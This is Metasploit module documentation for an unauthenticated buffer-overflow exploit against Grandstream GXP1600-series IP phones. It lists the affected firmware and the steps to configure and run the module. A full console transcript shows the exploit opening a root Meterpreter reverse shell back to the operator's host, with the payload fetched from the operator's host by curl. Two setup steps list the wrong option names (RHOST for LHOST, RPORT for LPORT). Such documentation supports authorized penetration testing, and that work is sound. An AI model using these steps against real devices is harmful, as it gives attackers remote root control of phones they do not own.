## Vulnerable Application
An unauthenticated stack-based buffer overflow vulnerability exists in the HTTP API endpoint
/cgi-bin/api.values.get. A remote attacker can leverage this vulnerability to achieve unauthenticated remote
code execution (RCE) with root privileges on a target device. The vulnerability affects all six device models
in the series: GXP1610, GXP1615, GXP1620, GXP1625, GXP1628, and GXP1630. The vulnerability affects all
firmware versions below version 1.0.7.81.

## Testing
This module was verified on a GXP1630 device running firmware version 1.0.7.78.

## Verification Steps

1. Start msfconsole
2. `use exploit/linux/http/grandstream_gxp1600_unauth_rce`

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`

Configure the payload to execute:

4. `set PAYLOAD cmd/linux/http/armle/meterpreter_reverse_tcp`
5. `set RHOST eth0`
6. `set RPORT 4444`
7. `set FETCH_SRVHOST <MSF_IP_ADDRESS>`

Run the module:

8. `check`
9. `exploit`

## Scenarios

### Example 1

```
msf > use exploit/linux/http/grandstream_gxp1600_unauth_rce 
[*] Using configured payload cmd/linux/http/armle/meterpreter_reverse_tcp
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > set RHOST 192.168.86.77
RHOST => 192.168.86.77
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > set LHOST eth0
LHOST => 192.168.86.122
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > set FETCH_SRVHOST eth0
[-] The following options failed to validate: Value 'eth0' is not valid for option 'FETCH_SRVHOST'.
FETCH_SRVHOST => 
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > set FETCH_SRVHOST 192.168.86.122
FETCH_SRVHOST => 192.168.86.122
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > show options 

Module options (exploit/linux/http/grandstream_gxp1600_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS     192.168.86.77    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to web admin
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/armle/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    true             yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Pyth
                                              on ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST   192.168.86.122   no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           192.168.86.122   yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      eHuRcleTyo       no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > check
[*] 192.168.86.77:80 - The target appears to be vulnerable. GrandStream GXP1630 version 1.0.7.78
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > exploit 
[*] Started reverse TCP handler on 192.168.86.122:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. GrandStream GXP1630 version 1.0.7.78
[*] Meterpreter session 1 opened (192.168.86.122:4444 -> 192.168.86.77:59112) at 2026-02-16 12:21:07 +0000
[!] This exploit may require manual cleanup of '/tmp/core.gz' on the target
[!] This exploit may require manual cleanup of '/core' on the target

meterpreter > getuid 
Server username: root
meterpreter > sysinfo
Computer     : gxp1630_c074ade84b53
OS           :  (Linux 3.4.20-rt31-dvf-v1.3.1.2-rc1)
Architecture : armv5tejl
BuildTuple   : armv5l-linux-musleabi
Meterpreter  : armle/linux
meterpreter > pwd
/app/war/cgi-bin
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter armle/linux  root @ gxp1630_c074ade84b53  192.168.86.122:4444 -> 192.168.86.77:59112 (192.168.86.77)

msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > 
```
